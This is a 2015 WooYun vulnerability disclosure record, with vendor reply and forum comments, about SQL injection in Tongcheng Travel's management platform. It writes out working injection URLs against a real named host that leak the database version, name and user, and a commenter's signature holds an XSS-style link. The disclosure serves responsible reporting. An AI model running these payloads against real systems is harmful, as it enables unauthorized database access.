{"id": 44953, "wybug_id": "wooyun-2015-0106658", "wybug_title": "苏州同程某管理平台存在boolean-based blind注入漏洞（附手工检测）", "wybug_corp": "苏州同程旅游网络科技有限公司", "wybug_author": "Mr.leo", "wybug_date": "2015-04-09 09:42", "wybug_open_date": "2015-04-09 15:29", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-09：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 苏州同程某管理平台存在boolean-based blind注入漏洞（附手工检测） 详细说明：  http://test1.www.51zfx.net/newadmin/Distributor/Login.aspx 苏州同程旅游管理平台V8.1注入参数：includestartdate注入点： /Reception.aspx?days=&days2=&fee2=&includestartdate=pUaHwnCN/ReceptionDJ.aspx?days=&days2=&fee2=&includestartdate=mYLmDd5I\n\n手工测试：（可以获取当前数据库名，用户，版本）http://test1.www.51zfx.net/Reception.aspx?title=&includestartdate=2015-04-08'+and+1=@@version--&type=&linegroup=&days=&title2=&linetype2=&linegroup2=&days2=&fee2=http://test1.www.51zfx.net/Reception.aspx?title=&includestartdate=1%27+and+1=db_name%28%29--&type=&linegroup=&days=&title2=&linetype2=&linegroup2=&days2=&fee2=%22http://test1.www.51zfx.net/Reception.aspx?title=&includestartdate=1%27+and+1=user--&type=&linegroup=&days=&title2=&linetype2=&linegroup2=&days2=&fee2=%22\n\n\n\n\n\n   漏洞证明：  已经证明   修复方案：  过滤参数   版权声明：转载请注明来源 Mr.leo@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-04-09 10:01 厂商回复： 感谢关注同程旅游，内部报过了，唉... 最新状态： 2015-04-09：已修复，测试站点未走软WAF，已下线。随手找了一个走软WAF的贴在评论里了，欢迎测试。  ", "replys": "漏洞评价：\n评论\n     2015-04-09 15:29 |    \t\t苏州同程旅游网络科技有限公司(乌云厂商)\t\t \n  http://45579.51zfx.net/    \n     2015-04-09 15:31 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:182 漏洞数:23        | 开发真是日了狗了)\t\t \n  这明明是error-based sqli    \n     2015-04-09 15:32 |    \t\tMr.leo \t\t\t( 普通白帽子  |\t\t\t        Rank:1314 漏洞数:176        | 说点神马呢！！)\t\t \n  @苏州同程旅游网络科技有限公司 给力啊！！    \n     2015-04-09 15:36 |    \t\tMr.leo \t\t\t( 普通白帽子  |\t\t\t        Rank:1314 漏洞数:176        | 说点神马呢！！)\t\t \n  @f4ckbaidu 好吧    \n     2015-04-09 15:48 |    \t\t九零奶嘴 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:4        | 小菜比)\t\t \n  0.0    \n     2015-04-09 16:09 |    \t\t苏州同程旅游网络科技有限公司(乌云厂商)\t\t \n  @Mr.leo 看到拦截日志里Netsparker一顿猛扫啊    \n     2015-04-09 16:12 |    \t\tMr.leo \t\t\t( 普通白帽子  |\t\t\t        Rank:1314 漏洞数:176        | 说点神马呢！！)\t\t \n  @苏州同程旅游网络科技有限公司 很有成就感把    \n     2015-04-09 16:57 |    \t\t静默 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:6        | 安全小白)\t\t \n  @苏州同程旅游网络科技有限公司 感觉你们公司内部报过好多，都是没处理的    \n     2015-04-09 18:21 |    \t\t苏州同程旅游网络科技有限公司(乌云厂商)\t\t \n  @静默 系统太多，有些报了之后我忘记跟了，有些部门不踢不走的。    \n     2015-04-09 19:03 |    \t\tJGHOOluwa \t\t\t( 普通白帽子  |\t\t\t        Rank:206 漏洞数:32        | 就是来看看大牛们如何超神的^-^)\t\t \n  路过，表示http://45579.51zfx.net/为什么管理员入口的密码输入进行了混淆，而合伙伙伴入口处就没有~~    \n     2015-04-09 19:24 |    \t\tDloveJ \t\t\t( 普通白帽子  |\t\t\t        Rank:1107 漏洞数:200        | <a href=javascrip:alert('xss')>s</a> 点...)\t\t \n  好厂商，鉴定完毕！    \n     2015-04-10 00:10 |    \t\t明月影 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:8        | 学姿势，学思路。)\t\t \n  厂商态度好。    \n     2015-04-10 10:53 |    \t\t孤独行者 \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:44        | 时光如水，总是无言。你若安好，便是晴天)\t\t \n  @苏州同程旅游网络科技有限公司 那就一直踢咯。。    \n     2015-04-10 10:55 |    \t\t静默 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:6        | 安全小白)\t\t \n  @苏州同程旅游网络科技有限公司 怪不得    \n     2015-04-10 11:14 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:182 漏洞数:23        | 开发真是日了狗了)\t\t \n  @苏州同程旅游网络科技有限公司 大牛，请教下那么大的公司用神马系统监控数据流，买的SOC还是自己用开源软件做的日志分析系统？    \n     2015-04-10 14:05 |    \t\t苏州同程旅游网络科技有限公司(乌云厂商)\t\t \n  @f4ckbaidu 哥，我是弱菜。之前看到opensoc 但是看硬件投入貌似比较大，感觉我一个人也搞不，它也只是提供了个框架。现在只是简单的用ELK（elasticsearch logstash kibana）监控下部分走软WAF（基于naxsi）的日志，完全没有什么高大上的大数据分析、统计建模、异常分析引擎啥的。这边刚起步，我也没相关经验，慢慢来吧。    \n     2015-04-10 14:22 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:182 漏洞数:23        | 开发真是日了狗了)\t\t \n  @苏州同程旅游网络科技有限公司 期待大牛日后能分享下这方面的经验，能在drops里投稿最好啦，谢谢    \n     2015-04-10 16:06 |    \t\txxyyzz \t\t\t( 实习白帽子  |\t\t\t        Rank:57 漏洞数:6        | 123456)\t\t \n  @苏州同程旅游网络科技有限公司 naxsi是不是性能比modsecurity好？大神    \n     2015-04-11 14:20 |    \t\tihacku \t\t\t( 普通白帽子  |\t\t\t        Rank:100 漏洞数:33        | 同程旅游安全工程师。找大神带节奏，邮箱 s...)\t\t \n  @xxyyzz 没实际对比过，但是这里软WAF是部署在虚拟机上的，之前有几次网卡流量都跑满过，所以naxsi性能肯定是没问题的。naxsi的问题在于如果不用白名单机制，默认的规则误拦太严重，拦截能力也不够。最新的RC版本集成了libinjection（modsecurity据说在用），拦截能力应该有很大提升。    \n     2015-04-11 17:37 |    \t\tkeny \t\t\t( 实习白帽子  |\t\t\t        Rank:50 漏洞数:21        )\t\t \n  小菜默默路过...    \n     2015-04-13 10:36 |    \t\tToySweet \t\t\t( 实习白帽子  |\t\t\t        Rank:36 漏洞数:8        | 做有道德的安全研究员。)\t\t \n  报错注入。。。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}